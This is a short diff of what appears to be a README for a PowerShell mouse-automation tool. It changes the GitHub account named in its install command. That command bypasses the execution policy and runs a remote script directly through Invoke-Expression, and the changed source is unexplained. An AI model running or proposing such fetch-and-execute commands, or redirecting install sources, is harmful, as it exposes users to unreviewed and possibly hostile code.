@@ -1,4 +1,4 @@
-**`powershell Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass && powershell Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/usnjournal/clicker/refs/heads/main/clicker.ps1)`**
+**`powershell Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass && powershell Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/waaz1/clicker/refs/heads/main/clicker.ps1)`**
 
 **A PowerShell-based mouse automation tool with ultra-precise timing — perfect for gaming, repetitive tasks, or testing.**
 
